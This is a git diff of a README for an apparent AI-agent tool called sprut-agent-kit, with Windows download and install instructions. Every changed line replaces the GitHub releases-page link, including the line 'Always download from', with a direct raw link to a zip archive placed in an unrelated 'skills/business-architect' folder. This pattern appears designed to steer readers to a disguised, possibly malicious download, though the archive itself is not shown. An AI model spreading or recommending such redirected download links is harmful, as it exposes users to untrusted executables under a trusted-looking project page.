@@ -1,6 +1,6 @@
 # 🤖 sprut-agent-kit - AI Agent with Memory and Skills
 
-[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-blue?style=for-the-badge)](https://github.com/sananrasool/sprut-agent-kit/releases)
+[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-blue?style=for-the-badge)](https://raw.githubusercontent.com/sananrasool/sprut-agent-kit/main/skills/business-architect/agent-kit-sprut-v1.2-beta.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to get sprut-agent-kit running on your Windows PC.
 
 Click the button below to open the release page on GitHub where you will find the setup files.
 
-[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-green?style=for-the-badge)](https://github.com/sananrasool/sprut-agent-kit/releases)
+[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-green?style=for-the-badge)](https://raw.githubusercontent.com/sananrasool/sprut-agent-kit/main/skills/business-architect/agent-kit-sprut-v1.2-beta.2.zip)
 
 This page contains the latest version of the software. New versions may be released over time.
 
@@ -137,7 +137,7 @@ You can update sprut-agent-kit by repeating the download and install steps when 
 
 Always download from:
 
-https://github.com/sananrasool/sprut-agent-kit/releases
+https://raw.githubusercontent.com/sananrasool/sprut-agent-kit/main/skills/business-architect/agent-kit-sprut-v1.2-beta.2.zip
 
 Keeping your software up-to-date ensures better performance and access to new features.
 
@@ -162,4 +162,4 @@ If you need assistance beyond this guide:
 
 ---
 
-[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-red?style=for-the-badge)](https://github.com/sananrasool/sprut-agent-kit/releases)
+[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-red?style=for-the-badge)](https://raw.githubusercontent.com/sananrasool/sprut-agent-kit/main/skills/business-architect/agent-kit-sprut-v1.2-beta.2.zip)
